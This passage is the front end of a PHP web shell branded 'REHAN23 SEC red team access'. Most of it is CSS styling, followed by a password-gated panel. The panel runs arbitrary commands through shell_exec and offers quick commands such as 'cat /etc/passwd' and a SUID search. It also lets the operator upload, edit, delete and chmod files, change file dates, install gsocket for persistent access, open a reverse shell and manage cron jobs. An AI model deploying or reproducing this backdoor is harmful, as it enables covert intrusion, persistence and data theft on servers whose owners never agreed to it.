            border: 1px solid rgba(0, 255, 100, 0.06);
            border-radius: 8px;
            padding: 8px 14px;
            text-decoration: none;
            transition: all 0.25s ease;
            position: relative;
            overflow: hidden;
        }
        .nav-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(0, 255, 100, 0.04), transparent);
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .nav-btn:hover::before { opacity: 1; }
        .nav-btn:hover {
            background: rgba(0, 255, 100, 0.06);
            border-color: rgba(0, 255, 100, 0.15);
            transform: translateX(4px);
            box-shadow: 0 0 20px rgba(0, 255, 100, 0.03);
        }
        .nav-btn .icon { font-size: 16px; width: 28px; text-align: center; flex-shrink: 0; }
        .nav-btn .nav-label {
            color: #88aa88;
            font-size: 13px;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
            transition: color 0.2s;
            flex: 1;
        }
        .nav-btn:hover .nav-label { color: #00ff66; text-shadow: 0 0 20px rgba(0,255,100,0.1); }
        .nav-btn .nav-path {
            color: #446644;
            font-size: 10px;
            font-family: 'JetBrains Mono', monospace;
            background: rgba(0, 255, 100, 0.04);
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid rgba(0, 255, 100, 0.04);
            flex-shrink: 0;
        }
        .nav-btn:hover .nav-path { color: #66aa88; border-color: rgba(0, 255, 100, 0.08); }

        .sidebar .footer {
            font-size: 10px;
            color: #2a442a;
            text-align: center;
            padding-top: 16px;
            border-top: 1px solid rgba(0, 255, 100, 0.06);
            margin-top: 6px;
            letter-spacing: 2px;
            font-family: 'Inter', sans-serif;
        }

        .main {
            flex: 1;
            padding: 24px 28px 28px;
            overflow-y: auto;
            height: 100vh;
            display: <?php echo ($authenticated ? 'flex' : 'none'); ?>;
            flex-direction: column;
            gap: 18px;
            position: relative;
            z-index: 2;
        }

        .terminal-wrapper {
            background: rgba(6, 12, 10, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 100, 0.12);
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 40px rgba(0, 255, 100, 0.04), inset 0 0 60px rgba(0, 255, 100, 0.02);
            flex-shrink: 0;
            transition: border-color 0.4s;
        }
        .terminal-wrapper:hover { border-color: rgba(0, 255, 100, 0.25); }
        .terminal-header {
            padding: 10px 18px;
            background: rgba(0, 255, 100, 0.03);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(0, 255, 100, 0.06);
        }
        .terminal-header .dots { display: flex; gap: 6px; }
        .terminal-header .dots span {
            width: 10px; height: 10px; border-radius: 50%;
            display: inline-block;
            transition: all 0.2s;
        }
        .terminal-header .dots .r { background: #ff3355; box-shadow: 0 0 8px rgba(255,51,85,0.3); }
        .terminal-header .dots .y { background: #ffcc00; box-shadow: 0 0 8px rgba(255,204,0,0.3); }
        .terminal-header .dots .g { background: #00ff66; box-shadow: 0 0 12px rgba(0,255,100,0.4); }
        .terminal-header .title {
            font-size: 11px;
            font-weight: 600;
            color: #446644;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-family: 'Inter', sans-serif;
        }
        .terminal-header .title i { color: #00ff66; font-style: normal; }
        .terminal-header .user-badge {
            font-size: 11px;
            color: #446644;
            background: rgba(0, 255, 100, 0.06);
            padding: 3px 14px;
            border-radius: 12px;
            border: 1px solid rgba(0, 255, 100, 0.08);
            font-family: 'JetBrains Mono', monospace;
        }
        .terminal-output {
            background: rgba(3, 8, 6, 0.9);
            color: #88dd88;
            padding: 16px 20px;
            max-height: 210px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.9;
            white-space: pre-wrap;
            min-height: 70px;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
        }
        .terminal-output .prompt { color: #446644; }
        .terminal-output .cmd-text { color: #00ff66; font-weight: 600; text-shadow: 0 0 20px rgba(0,255,100,0.1); }
        .terminal-output .output-text { color: #88bb88; }
        .terminal-input-wrap {
            display: flex;
            align-items: center;
            background: rgba(4, 10, 8, 0.9);
            padding: 8px 18px;
            border-top: 1px solid rgba(0, 255, 100, 0.06);
        }
        .terminal-input-wrap .prompt-symbol {
            color: #00ff66;
            font-weight: 700;
            font-size: 16px;
            margin-right: 10px;
            text-shadow: 0 0 20px rgba(0,255,100,0.2);
        }
        .terminal-input-wrap input {
            flex: 1;
            background: transparent;
            border: none;
            color: #b8e6b8;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 13px;
            outline: none;
        }
        .terminal-input-wrap input::placeholder { color: #2a442a; }
        .terminal-input-wrap button {
            background: rgba(0, 255, 100, 0.08);
            color: #00ff66;
            border: 1px solid rgba(0, 255, 100, 0.15);
            padding: 5px 16px;
            border-radius: 4px;
            font-weight: 700;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.25s;
            font-family: 'JetBrains Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .terminal-input-wrap button:hover {
            background: #00ff66;
            color: #030308;
            box-shadow: 0 0 30px rgba(0, 255, 100, 0.2);
        }

        .quick-cmds {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            padding: 6px 18px 12px;
            background: rgba(4, 10, 8, 0.9);
            border-top: 1px solid rgba(0, 255, 100, 0.03);
        }
        .quick-cmds button {
            background: rgba(0, 255, 100, 0.04);
            color: #558855;
            border: 1px solid rgba(0, 255, 100, 0.06);
            padding: 3px 12px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 10.5px;
            font-weight: 600;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 0.3px;
        }
        .quick-cmds button:hover {
            background: rgba(0, 255, 100, 0.12);
            color: #00ff66;
            border-color: rgba(0, 255, 100, 0.2);
            box-shadow: 0 0 20px rgba(0, 255, 100, 0.05);
        }

        .toolbar {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            align-items: center;
        }
        .toolbar input[type="file"] {
            color: #88aa88;
            font-size: 12px;
            background: rgba(0, 255, 100, 0.04);
            padding: 8px 14px;
            border-radius: 6px;
            border: 1px solid rgba(0, 255, 100, 0.08);
            font-family: 'JetBrains Mono', monospace;
            cursor: pointer;
            backdrop-filter: blur(4px);
        }
        .toolbar input[type="file"]::file-selector-button {
            background: rgba(0, 255, 100, 0.06);
            border: 1px solid rgba(0, 255, 100, 0.08);
            padding: 4px 14px;
            border-radius: 4px;
            color: #88aa88;
            font-weight: 600;
            cursor: pointer;
            margin-right: 10px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
        }
        .toolbar input[type="file"]::file-selector-button:hover {
            background: rgba(0, 255, 100, 0.12);
            color: #00ff66;
        }
        .btn {
            padding: 8px 18px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 700;
            font-size: 11px;
            transition: all 0.25s;
            font-family: 'JetBrains Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .btn-upload {
            background: rgba(0, 255, 100, 0.08);
            color: #00ff66;
            border: 1px solid rgba(0, 255, 100, 0.12);
            box-shadow: 0 0 20px rgba(0, 255, 100, 0.03);
        }
        .btn-upload:hover {
            background: #00ff66;
            color: #030308;
            box-shadow: 0 0 40px rgba(0, 255, 100, 0.15);
        }
        .btn-gsocket {
            background: rgba(0, 255, 100, 0.12);
            color: #00ff66;
            border: 1px solid rgba(0, 255, 100, 0.25);
            box-shadow: 0 0 25px rgba(0, 255, 100, 0.08);
            animation: pulse-glow 2.5s ease-in-out infinite;
        }
        .btn-gsocket:hover {
            background: #00ff66;
            color: #030308;
            box-shadow: 0 0 50px rgba(0, 255, 100, 0.25);
            transform: scale(1.02);
        }
        .btn-create {
            background: rgba(100, 200, 255, 0.08);
            color: #66ccff;
            border: 1px solid rgba(100, 200, 255, 0.15);
            box-shadow: 0 0 20px rgba(100, 200, 255, 0.03);
        }
        .btn-create:hover {
            background: #66ccff;
            color: #030308;
            box-shadow: 0 0 40px rgba(100, 200, 255, 0.15);
            transform: scale(1.02);
        }
        .btn-bulk-delete {
            background: rgba(204, 68, 102, 0.08);
            color: #ff4466;
            border: 1px solid rgba(204, 68, 102, 0.15);
        }
        .btn-bulk-delete:hover:not(:disabled) {
            background: #cc4466;
            color: #fff;
            box-shadow: 0 0 40px rgba(204, 68, 102, 0.15);
            transform: scale(1.02);
        }
        .btn-bulk-delete:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none !important;
        }
        .btn-scan {
            background: rgba(255, 200, 0, 0.08);
            color: #ffcc00;
            border: 1px solid rgba(255, 200, 0, 0.15);
            box-shadow: 0 0 20px rgba(255, 200, 0, 0.03);
        }
        .btn-scan:hover {
            background: #ffcc00;
            color: #030308;
            box-shadow: 0 0 40px rgba(255, 200, 0, 0.15);
            transform: scale(1.02);
        }
        .btn-reverse {
            background: rgba(255, 0, 100, 0.08);
            color: #ff4466;
            border: 1px solid rgba(255, 0, 100, 0.15);
        }
        .btn-reverse:hover {
            background: #ff4466;
            color: #fff;
            box-shadow: 0 0 40px rgba(255, 68, 102, 0.15);
            transform: scale(1.02);
        }
        .btn-cron {
            background: rgba(0, 200, 255, 0.08);
            color: #00ccff;
            border: 1px solid rgba(0, 200, 255, 0.15);
        }
        .btn-cron:hover {
            background: #00ccff;
            color: #030308;
            box-shadow: 0 0 40px rgba(0, 200, 255, 0.15);
            transform: scale(1.02);
        }
        .btn-activity {
            background: rgba(200, 200, 0, 0.08);
            color: #cccc00;
            border: 1px solid rgba(200, 200, 0, 0.15);
        }
        .btn-activity:hover {
            background: #cccc00;
            color: #030308;
            box-shadow: 0 0 40px rgba(200, 200, 0, 0.15);
            transform: scale(1.02);
        }
        /* ======================================================== */
        /* TAMBAHAN: TOMBOL LOGOUT DENGAN WARNA MERAH */
        .btn-logout {
            background: rgba(204, 68, 102, 0.12);
            color: #ff4466;
            border: 1px solid rgba(204, 68, 102, 0.2);
            box-shadow: 0 0 15px rgba(204, 68, 102, 0.05);
        }
        .btn-logout:hover {
            background: #cc4466;
            color: #fff;
            box-shadow: 0 0 30px rgba(204, 68, 102, 0.2);
            transform: scale(1.02);
        }
        /* ======================================================== */

        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 25px rgba(0, 255, 100, 0.08); }
            50% { box-shadow: 0 0 45px rgba(0, 255, 100, 0.2); }
        }

        .file-area {
            flex: 1;
            overflow: auto;
            background: rgba(0, 255, 100, 0.01);
            backdrop-filter: blur(4px);
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 100, 0.06);
            min-height: 200px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        th {
            background: rgba(0, 255, 100, 0.04);
            color: #558855;
            padding: 12px 14px;
            text-align: left;
            font-weight: 700;
            font-size: 10px;
            letter-spacing: 1px;
            text-transform: uppercase;
            border-bottom: 1px solid rgba(0, 255, 100, 0.06);
            font-family: 'Inter', sans-serif;
            position: sticky;
            top: 0;
            z-index: 5;
            backdrop-filter: blur(8px);
        }
        td {
            padding: 10px 14px;
            border-bottom: 1px solid rgba(0, 255, 100, 0.04);
            color: #88aa88;
            font-family: 'JetBrains Mono', monospace;
            vertical-align: middle;
        }
        tr:hover td { background: rgba(0, 255, 100, 0.04); }
        td a { 
            color: #88aa88; 
            text-decoration: none; 
            font-weight: 500; 
            transition: all 0.2s;
            cursor: pointer;
        }
        td a:hover { color: #00ff66; text-shadow: 0 0 20px rgba(0,255,100,0.1); }
        .file-icon { margin-right: 8px; }
        .size-badge {
            color: #446644;
            font-size: 11px;
            font-weight: 600;
            background: rgba(0, 255, 100, 0.04);
            padding: 2px 12px;
            border-radius: 10px;
            border: 1px solid rgba(0, 255, 100, 0.06);
            white-space: nowrap;
        }
        .perm-badge {
            color: #668866;
            font-size: 11px;
            background: rgba(0, 255, 100, 0.03);
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid rgba(0, 255, 100, 0.05);
            font-family: 'JetBrains Mono', monospace;
        }
        .action-btn {
            background: rgba(0, 255, 100, 0.04);
            color: #88aa88;
            border: 1px solid rgba(0, 255, 100, 0.06);
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
            cursor: pointer;
            transition: all 0.2s;
            margin: 1px 2px;
        }
        .action-btn:hover {
            background: rgba(0, 255, 100, 0.12);
            color: #00ff66;
            border-color: rgba(0, 255, 100, 0.2);
        }
        .action-btn.danger:hover {
            background: rgba(204, 68, 102, 0.15);
            color: #ff4466;
            border-color: rgba(204, 68, 102, 0.2);
        }

        .file-checkbox {
            accent-color: #00ff66;
            width: 16px;
            height: 16px;
            cursor: pointer;
            background: rgba(0, 255, 100, 0.05);
            border-radius: 3px;
        }
        .file-checkbox:hover { transform: scale(1.1); }
        .select-all-checkbox {
            accent-color: #00ff66;
            width: 16px;
            height: 16px;
            cursor: pointer;
        }

        .bulk-counter {
            color: #446644;
            font-size: 12px;
            padding: 8px 16px;
            background: rgba(0, 255, 100, 0.04);
            border-radius: 4px;
            border: 1px solid rgba(0, 255, 100, 0.06);
            font-family: 'JetBrains Mono', monospace;
        }
        .bulk-counter.active {
            color: #00ff66;
            border-color: rgba(0, 255, 100, 0.2);
        }

        .status-msg {
            padding: 10px 16px;
            border-radius: 6px;
            font-size: 13px;
            border-left: 3px solid transparent;
            margin: 4px 0;
            animation: fadeIn 0.3s ease;
        }
        .status-msg.success {
            background: rgba(0, 255, 100, 0.04);
            border-left-color: #00ff66;
            color: #88dd88;
        }
        .status-msg.error {
            background: rgba(204, 68, 102, 0.04);
            border-left-color: #cc4466;
            color: #ff6688;
        }

        .popup-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(3, 3, 8, 0.92);
            backdrop-filter: blur(12px);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        .popup-overlay.active { display: flex; }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .popup-box {
            background: rgba(6, 12, 10, 0.95);
            border: 1px solid rgba(0, 255, 100, 0.2);
            border-radius: 14px;
            max-width: 850px;
            width: 95%;
            max-height: 85vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 80px rgba(0, 255, 100, 0.06);
            overflow: hidden;
        }
        .popup-header {
            padding: 14px 22px;
            background: rgba(0, 255, 100, 0.04);
            border-bottom: 1px solid rgba(0, 255, 100, 0.08);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }
        .popup-header h2 {
            font-size: 16px;
            font-weight: 700;
            color: #00ff66;
            text-shadow: 0 0 20px rgba(0,255,100,0.1);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .popup-header .close-btn {
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            color: #888;
            width: 34px; height: 34px;
            border-radius: 50%;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .popup-header .close-btn:hover {
            background: #cc4466;
            color: #fff;
            border-color: #cc4466;
        }
        .popup-body {
            padding: 20px 24px;
            overflow-y: auto;
            flex: 1;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.8;
            color: #88bb88;
            background: rgba(0, 0, 0, 0.2);
            max-height: 55vh;
        }
        .popup-body input, .popup-body textarea, .popup-body select {
            background: rgba(0, 255, 100, 0.04);
            border: 1px solid rgba(0, 255, 100, 0.08);
            color: #b8e6b8;
            padding: 8px 12px;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            width: 100%;
            margin: 4px 0 10px 0;
            outline: none;
            transition: border-color 0.2s;
        }
        .popup-body input:focus, .popup-body textarea:focus, .popup-body select:focus {
            border-color: rgba(0, 255, 100, 0.3);
        }
        .popup-body textarea {
            min-height: 120px;
            resize: vertical;
        }
        .popup-body label {
            color: #668866;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        .popup-body .btn-submit {
            background: rgba(0, 255, 100, 0.08);
            color: #00ff66;
            border: 1px solid rgba(0, 255, 100, 0.15);
            padding: 8px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;
            font-size: 12px;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 6px;
        }
        .popup-body .btn-submit:hover {
            background: #00ff66;
            color: #030308;
            box-shadow: 0 0 30px rgba(0, 255, 100, 0.15);
        }
        .popup-body .btn-submit.danger {
            border-color: rgba(204, 68, 102, 0.2);
            color: #ff4466;
        }
        .popup-body .btn-submit.danger:hover {
            background: #cc4466;
            color: #030308;
        }
        .popup-footer {
            padding: 14px 22px;
            border-top: 1px solid rgba(0, 255, 100, 0.06);
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            flex-shrink: 0;
            background: rgba(0,0,0,0.2);
        }
        .popup-footer .btn-close-popup {
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.08);
            color: #aaa;
            padding: 8px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.2s;
        }
        .popup-footer .btn-close-popup:hover {
            background: rgba(255,255,255,0.08);
            color: #fff;
        }

        .popup-loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(0, 255, 100, 0.1);
            border-top: 2px solid #00ff66;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .cron-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 6px 10px;
            border-bottom: 1px solid rgba(0,255,100,0.04);
            font-size: 12px;
            gap: 10px;
        }
        .cron-item:hover { background: rgba(0,255,100,0.03); }
        .cron-item .cmd { color: #88aa88; word-break: break-all; flex: 1; }
        .cron-item .del-cron {
            color: #ff4466;
            cursor: pointer;
            font-size: 16px;
            padding: 0 8px;
        }
        .cron-item .del-cron:hover { color: #ff6688; }

        /* ========== BREADCRUMB ENHANCED ========== */
        .breadcrumb {
            background: rgba(0, 255, 100, 0.04);
            backdrop-filter: blur(8px);
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 15px;
            border: 1px solid rgba(0, 255, 100, 0.08);
            font-family: 'JetBrains Mono', monospace;
            color: #e8e8f0;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 2px;
            line-height: 1.8;
        }
        .breadcrumb a {
            color: #e8e8f0;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.2s ease;
            padding: 2px 6px;
            border-radius: 4px;
            letter-spacing: 0.3px;
        }
        .breadcrumb a:hover {
            color: #00ff66;
            text-shadow: 0 0 24px rgba(0, 255, 100, 0.15);
            background: rgba(0, 255, 100, 0.06);
        }
        .breadcrumb .sep {
            color: #446644;
            font-size: 18px;
            font-weight: 700;
            margin: 0 2px;
        }
        .breadcrumb .folder-icon {
            margin-right: 6px;
            font-size: 16px;
        }
        .breadcrumb .current {
            color: #00ff66;
            font-weight: 700;
            font-size: 16px;
            text-shadow: 0 0 20px rgba(0, 255, 100, 0.1);
        }
    </style>
</head>
<body>

<!-- ========== LOGIN OVERLAY ========== -->
<div id="loginOverlay">
    <div class="login-container">
        <div class="login-title">🛡️ REHAN23 SEC</div>
        <div class="login-sub">⏣ RED TEAM ACCESS</div>
        <form method="post" id="loginForm">
            <div class="login-pwd-container">
                <input type="password" name="_k" id="loginPwdInput" class="login-input" placeholder="⎔ ENTER PASSWORD" autocomplete="off" autofocus>
                <div class="login-error" id="loginError">⛔ WRONG PASSWORD</div>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">↳ UNLOCK</button>
        </form>
    </div>
</div>

<!-- ========== SIDEBAR ========== -->
<div class="sidebar">
    <div class="brand"><span>🛡️</span> REHAN23<span style="color:#446644;">SEC</span></div>
    <div class="brand-sub">⚡ red team · ultimate</div>
    <div class="info">
        <i>🖥️ Server</i> <span><?= php_uname('n') ?></span><br>
        <i>🌐 Server IP</i> <span><?= $_SERVER['SERVER_ADDR'] ?? 'N/A' ?></span><br>
        <i>🔌 Your IP</i> <span><?= $_SERVER['REMOTE_ADDR'] ?? 'N/A' ?></span><br>
        <i>⚙️ Web Server</i> <span><?= $_SERVER['SERVER_SOFTWARE'] ?? 'N/A' ?></span><br>
        <i>💻 System</i> <span><?= php_uname('s') . ' ' . php_uname('r') ?></span><br>
        <i>👤 User</i> <span><?= get_current_user() ?></span><br>
        <i>🐘 PHP Version</i> <span><?= phpversion() ?></span><br>
        <i>🚫 Disable Function</i> <span style="font-size:10px;color:#668866;"><?= ini_get('disable_functions') ?: 'none' ?></span>
    </div>
    <div class="nav-section">
        <div class="label">📁 EXPLORE · PATHS</div>
        <div class="nav-grid">
            <a href="?d=/" class="nav-btn">
                <span class="icon">💿</span>
                <span class="nav-label">Root</span>
                <span class="nav-path">/</span>
            </a>
            <a href="?d=/home" class="nav-btn">
                <span class="icon">🏠</span>
                <span class="nav-label">Home</span>
                <span class="nav-path">/home</span>
            </a>
            <a href="?d=/var/www" class="nav-btn">
                <span class="icon">🌐</span>
                <span class="nav-label">Web</span>
                <span class="nav-path">/var/www</span>
            </a>
            <a href="?d=/tmp" class="nav-btn">
                <span class="icon">📦</span>
                <span class="nav-label">Temp</span>
                <span class="nav-path">/tmp</span>
            </a>
            <a href="?d=/etc" class="nav-btn">
                <span class="icon">⚙️</span>
                <span class="nav-label">Config</span>
                <span class="nav-path">/etc</span>
            </a>
            <a href="?d=/var/log" class="nav-btn">
                <span class="icon">📋</span>
                <span class="nav-label">Logs</span>
                <span class="nav-path">/var/log</span>
            </a>
        </div>
    </div>
    <div class="footer">◈ Encode · Paranoid v7</div>
</div>

<!-- ========== MAIN ========== -->
<div class="main">
    <!-- TERMINAL -->
    <div class="terminal-wrapper">
        <div class="terminal-header">
            <div class="dots">
                <span class="r"></span><span class="y"></span><span class="g"></span>
            </div>
            <span class="title"><i>⏣</i> REHAN23 · terminal</span>
            <span class="user-badge"><span class="status-dot"></span><?= get_current_user() ?>@<?= php_uname('n') ?></span>
        </div>

        <?php if(isset($_POST['cmd'])): ?>
        <div class="terminal-output">
            <span class="prompt">⤷</span> <span class="cmd-text"><?= htmlspecialchars($_POST['cmd']) ?></span><br>
            <span class="output-text"><?= htmlspecialchars(shell_exec($_POST['cmd'].' 2>&1') ?: '∅ void') ?></span>
        </div>
        <?php else: ?>
        <div class="terminal-output" style="color:#2a442a;">⏎ █ ready — inject command</div>
        <?php endif; ?>

        <form method="post" id="termForm">
            <div class="terminal-input-wrap">
                <span class="prompt-symbol">❯</span>
                <input name="cmd" id="cmdInput" placeholder="uname -a" autofocus autocomplete="off">
                <button>⏎ exec</button>
            </div>
        </form>
        <div class="quick-cmds">
            <?php $cmds=['id','whoami','uname -a','ls -la','pwd','ps aux','netstat -tlnp','cat /etc/passwd','find / -perm -4000 2>/dev/null','crontab -l','df -h','free -m'];
            foreach($cmds as $qc): ?>
            <button onclick="document.getElementById('cmdInput').value='<?=$qc?>';document.getElementById('termForm').submit()"><?=$qc?></button>
            <?php endforeach; ?>
        </div>
    </div>

    <!-- ========== BREADCRUMB ENHANCED ========== -->
    <div class="breadcrumb">
        <?php
        $p = explode('/', str_replace('\\','/',getcwd()));
        $total = count($p);
        $idx = 0;
        echo '<span class="folder-icon">📂</span>';
        echo '<a href="?d=/" style="font-weight:700;font-size:16px;">/</a>';
        $acc = '';
        foreach($p as $i=>$v){
            if($v=='') continue;
            $acc .= '/'.$v;
            $idx++;
            if($idx == $total - 1){
                echo ' <span class="sep">›</span> ';
                echo '<span class="current">' . htmlspecialchars($v) . '</span>';
            } else {
                echo ' <span class="sep">›</span> ';
                echo '<a href="?d='.$acc.'" style="font-weight:600;font-size:16px;">' . htmlspecialchars($v) . '</a>';
            }
        }
        ?>
    </div>

    <!-- TOOLBAR -->
    <div class="toolbar">
        <form method="post" enctype="multipart/form-data" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
            <input type="file" name="f">
            <button name="u" class="btn btn-upload">⬆ upload</button>
        </form>
        <button class="btn btn-create" onclick="openCreateFilePopup()">📄 CREATE FILE</button>
        <span class="bulk-counter" id="bulkCounter">0 selected</span>
        <button type="button" class="btn btn-bulk-delete" id="bulkDeleteBtn" disabled>🗑 DELETE SELECTED</button>
        <form method="post" style="display:inline;">
            <button type="submit" name="install_gsocket" value="1" class="btn btn-gsocket" id="installGsocketBtn">
                ⚡ INSTALL GSOCKET
            </button>
        </form>
        <button class="btn btn-scan" onclick="openScanPopup()">🔍 SCAN MALWARE</button>
        <button class="btn btn-reverse" onclick="openReverseShellPopup()">💀 REVERSE SHELL</button>
        <button class="btn btn-cron" onclick="openCronPopup()">⏰ CRON JOBS</button>
        <button class="btn btn-activity" onclick="openActivityPopup()">📋 ACTIVITY LOG</button>
        
        <!-- ========== TOMBOL LOGOUT ========== -->
        <a href="?logout" class="btn btn-logout" onclick="return confirm('Apakah Anda yakin ingin logout? Cookie login akan dihapus.');">🚪 LOGOUT</a>
    </div>

    <!-- STATUS MESSAGE -->
    <div id="statusMessageContainer">
        <?php if($action_result): ?>
        <div class="status-msg <?= $action_status ?>">
            <?= htmlspecialchars($action_result) ?>
        </div>
        <?php endif; ?>
    </div>

    <!-- FILE TABLE -->
    <div class="file-area">
        <table>
            <thead>
                <tr>
                    <th style="width:30px;">
                        <input type="checkbox" class="select-all-checkbox" id="selectAll" onchange="toggleAllChecks(this)">
                    </th>
                    <th style="min-width:180px;">📄 Name</th>
                    <th style="width:80px;">Size</th>
                    <th style="width:150px;">Modified</th>
                    <th style="width:120px;">Owner</th>
                    <th style="width:90px;">Perms</th>
                    <th style="min-width:240px;">⚡ Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach($f as $x): 
                    $full_path = getcwd().'/'.$x;
                    $is_dir = is_dir($full_path);
                    $size = $is_dir ? 'DIR' : round(filesize($full_path)/1024, 2).' KB';
                    $mtime = date('Y-m-d H:i:s', filemtime($full_path));
                    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($full_path))['name'] : fileowner($full_path);
                    $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                    
                    $esc_name = addslashes($x);
                    $esc_path = addslashes($full_path);
                ?>
                <tr>
                    <td>
                        <input type="checkbox" name="selected_files[]" value="<?= htmlspecialchars($full_path) ?>" class="file-checkbox" onchange="updateBulkCounter()">
                    </td>
                    <td>
                        <span class="file-icon"><?= $is_dir?'📁':'📄' ?></span>
                        <a href="<?= $is_dir?'?d='.urlencode($full_path):'?edit='.urlencode($full_path) ?>">
                            <?= htmlspecialchars($x) ?>
                        </a>
                    </td>
                    <td><span class="size-badge"><?= $size ?></span></td>
                    <td style="font-size:12px;color:#668866;"><?= $mtime ?></td>
                    <td style="font-size:12px;color:#668866;"><?= htmlspecialchars($owner) ?></td>
                    <td><span class="perm-badge"><?= $perms ?></span></td>
                    <td>
                        <button class="action-btn" onclick="openPopup('edit','<?= $esc_path ?>','<?= $esc_name ?>')">✏️ Edit</button>
                        <button class="action-btn" onclick="openPopup('rename','<?= $esc_path ?>','<?= $esc_name ?>')">📝 Rename</button>
                        <button class="action-btn" onclick="openPopup('chmod','<?= $esc_path ?>','<?= $esc_name ?>','<?= $perms ?>')">🔒 Chmod</button>
                        <button class="action-btn" onclick="openPopup('chdate','<?= $esc_path ?>','<?= $esc_name ?>','<?= $mtime ?>')">📅 Chdate</button>
                        <?php if(!$is_dir && pathinfo($x, PATHINFO_EXTENSION) === 'zip'): ?>
                        <button class="action-btn" onclick="openPopup('unzip','<?= $esc_path ?>','<?= $esc_name ?>')">📦 Unzip</button>
                        <?php endif; ?>
                        <button class="action-btn danger" onclick="if(confirm('Delete <?= addslashes($x) ?>?')){window.location.href='?delete=<?= urlencode($full_path) ?>'}">🗑 Delete</button>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- ========== GSOCKET POPUP ========== -->
<div class="popup-overlay" id="gsocketPopup">
    <div class="popup-box">
        <div class="popup-header">
            <h2><span>⚡</span> GSOCKET INSTALLER</h2>
            <button class="close-btn" id="closePopupBtn">✕</button>
        </div>
        <div class="popup-body" id="popupBody">
            <?php if($gsocket_output): ?>
            <?php 
                $lines = explode("\n", $gsocket_output);
                foreach($lines as $line):
                    $class = '';
                    if(strpos($line, '✅') !== false || strpos($line, 'SUCCESSFULLY') !== false) $class = 'log-success';
                    else if(strpos($line, '❌') !== false || strpos($line, 'FAILED') !== false || strpos($line, 'error') !== false) $class = 'log-error';
                    else if(strpos($line, '[+]') !== false) $class = 'log-info';
                    else if(strpos($line, '[!]') !== false) $class = 'log-warning';
            ?>
            <div class="log-line <?= $class ?>"><?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
            <?php else: ?>
            <div style="color:#446644;">⏳ Click "INSTALL GSOCKET" to start installation...</div>
            <?php endif; ?>
        </div>
        <div class="popup-footer">
            <button class="btn-copy-log" id="copyLogBtn">📋 COPY LOG</button>
            <button class="btn-close-popup" id="closePopupBtn2">CLOSE</button>
        </div>
    </div>
</div>

<!-- ========== SCAN MALWARE POPUP ========== -->
<div class="popup-overlay" id="scanPopup">
    <div class="popup-box" style="max-width:850px;">
        <div class="popup-header">
            <h2><span>🔍</span> SCAN MALWARE RESULT</h2>
            <button class="close-btn" id="closeScanPopup">✕</button>
        </div>
        <div class="popup-body" id="scanBody" style="max-height:60vh;">
            <div id="scanLoading">
